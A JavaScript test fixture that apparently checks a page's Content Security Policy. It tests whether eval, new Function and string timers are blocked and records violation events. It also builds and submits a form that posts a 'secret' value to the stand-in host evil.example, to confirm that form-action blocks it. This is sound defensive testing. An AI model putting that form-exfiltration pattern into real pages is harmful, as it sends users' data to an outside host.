/* CSP probe, served only by the local test server (tests/serve.mjs). Runs as a normal page script. */
(function () {
  const r = window.__cspProbe = { violations: [] };
  document.addEventListener('securitypolicyviolation', e => r.violations.push(e.violatedDirective + ' ' + (e.blockedURI || '')));
  try { eval('1+1'); r.evalBlocked = false; } catch (e) { r.evalBlocked = true; }
  try { new Function('return 1')(); r.newFunctionBlocked = false; } catch (e) { r.newFunctionBlocked = true; }
  try { setTimeout('window.__st = 1', 0); } catch (e) { }
  const f = document.createElement('form'); f.action = 'https://evil.example/post'; f.method = 'post'; f.target = '_self';
  const i = document.createElement('input'); i.name = 'd'; i.value = 'secret'; f.appendChild(i); document.body.appendChild(f);
  window.addEventListener('beforeunload', () => { r.navigatedAway = true; });
  setTimeout(() => { try { f.submit(); } catch (e) { r.formError = String(e); } }, 50);
  setTimeout(() => { r.stringTimeoutBlocked = !window.__st; r.formBlocked = r.violations.some(x => x.startsWith('form-action')); r.done = true; }, 900);
})();
